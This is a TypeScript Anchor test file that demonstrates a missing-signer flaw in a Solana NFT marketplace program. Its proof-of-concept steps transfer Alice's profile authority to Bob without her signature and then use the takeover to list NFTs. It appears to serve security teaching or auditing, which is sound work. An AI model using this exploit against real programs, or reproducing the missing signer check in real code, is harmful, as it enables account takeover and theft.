import * as anchor from "@coral-xyz/anchor";
import { Program } from "@coral-xyz/anchor";
import { AccountInit2 } from "../target/types/account_init_2";
import { Keypair, PublicKey, SystemProgram } from "@solana/web3.js";
import { expect } from "chai";

describe("NFT Marketplace Authority Transfer", () => {
  anchor.setProvider(anchor.AnchorProvider.env());

  const program = anchor.workspace.account2 as Program<AccountInit2>;
  const provider = anchor.getProvider();

  // Helper function to display program logs
  const showProgramLogs = async (txSig: string, description: string) => {
    console.log(`\n--- Program Logs for ${description} ---`);
    try {
      const tx = await provider.connection.getTransaction(txSig, {
        commitment: "confirmed",
        maxSupportedTransactionVersion: 0,
      });
      
      if (tx && tx.meta && tx.meta.logMessages) {
        tx.meta.logMessages.forEach(log => {
          if (log.includes("Program log:")) {
            console.log("📝", log.replace("Program log: ", ""));
          }
        });
      } else {
        console.log("⚠️  No logs found for this transaction");
      }
    } catch (error) {
      console.log("❌ Error retrieving logs:", error);
    }
    console.log("--- End Program Logs ---\n");
  };

  let alice: Keypair;
  let bob: Keypair;
  let aliceProfilePda: PublicKey;

  beforeEach(async () => {
    alice = Keypair.generate();
    bob = Keypair.generate();

    await provider.connection.requestAirdrop(alice.publicKey, 5 * anchor.web3.LAMPORTS_PER_SOL);
    await provider.connection.requestAirdrop(bob.publicKey, 2 * anchor.web3.LAMPORTS_PER_SOL);
    
    await new Promise(resolve => setTimeout(resolve, 1000));

    [aliceProfilePda] = await anchor.web3.PublicKey.findProgramAddress(
      [Buffer.from("profile"), alice.publicKey.toBuffer()],
      program.programId
    );
  });

  it("should demonstrate unauthorized authority transfer vulnerability", async () => {
    console.log("Testing authority transfer vulnerability");
    console.log("Alice:", alice.publicKey.toBase58());
    console.log("Bob:", bob.publicKey.toBase58());
    console.log("Profile PDA:", aliceProfilePda.toBase58());

    // Step 1: Setup - Alice creates profile
    console.log("\nStep 1: Alice creates her profile");
    const createTxSig = await program.methods
      .initializeProfile("alice_the_artist")
      .accounts({
        userProfile: aliceProfilePda,
        authority: alice.publicKey,
        systemProgram: SystemProgram.programId,
      })
      .signers([alice])
      .rpc();

    await showProgramLogs(createTxSig, "Profile Creation");
    console.log("Profile created successfully");

    // Step 2: Alice lists an NFT
    console.log("\nStep 2: Alice lists an NFT");
    const nftMint = Keypair.generate().publicKey;
    const listTxSig = await program.methods
      .listNft(new anchor.BN(1_000_000_000), nftMint)
      .accounts({ userProfile: aliceProfilePda, authority: alice.publicKey })
      .signers([alice])
      .rpc();

    await showProgramLogs(listTxSig, "NFT Listing");
    console.log("NFT listed successfully");

    // Step 3: Unauthorized authority transfer
    console.log("\nStep 3: Attempting unauthorized authority transfer");
    const transferTxSig = await program.methods
      .updateProfileAuthority()
      .accounts({
        userProfile: aliceProfilePda,
        newAuthority: bob.publicKey,
        authority: alice.publicKey, // Alice not signing
      })
      .rpc(); // Only provider wallet signs

    await showProgramLogs(transferTxSig, "Unauthorized Authority Transfer");

    const profileAfter = await program.account.userProfile.fetch(aliceProfilePda);
    console.log("Authority transfer completed");
    console.log("New authority:", profileAfter.authority.toBase58());

    expect(profileAfter.authority.toBase58()).to.equal(bob.publicKey.toBase58());

    // Step 4: Alice is now blocked
    console.log("\nStep 4: Alice can no longer access her profile");
    try {
      await program.methods
        .listNft(new anchor.BN(2_000_000_000), Keypair.generate().publicKey)
        .accounts({ userProfile: aliceProfilePda, authority: alice.publicKey })
        .signers([alice])
        .rpc();
      throw new Error("Alice should not be able to list");
    } catch (e) {
      console.log("Alice's access denied:", (e as Error).message);
      expect((e as Error).message).to.match(/Unauthorized/);
    }

    // Step 5: Bob can now control the profile
    console.log("\nStep 5: Bob now controls Alice's profile");
    const bobListTxSig = await program.methods
      .listNft(new anchor.BN(3_000_000_000), Keypair.generate().publicKey)
      .accounts({ userProfile: aliceProfilePda, authority: bob.publicKey })
      .signers([bob])
      .rpc();

    await showProgramLogs(bobListTxSig, "Bob's NFT Listing (Account Takeover)");

    // Vulnerability Analysis
    console.log("\n=== VULNERABILITY ANALYSIS ===");
    console.log("Vulnerability: Missing Signer Authorization");
    console.log("- Authority account not required to sign transaction");
    console.log("- Missing 'signer' constraint on authority account");
    console.log("- Anyone can change profile authority without owner consent");
    console.log("- Results in unauthorized account takeover");
  });
});
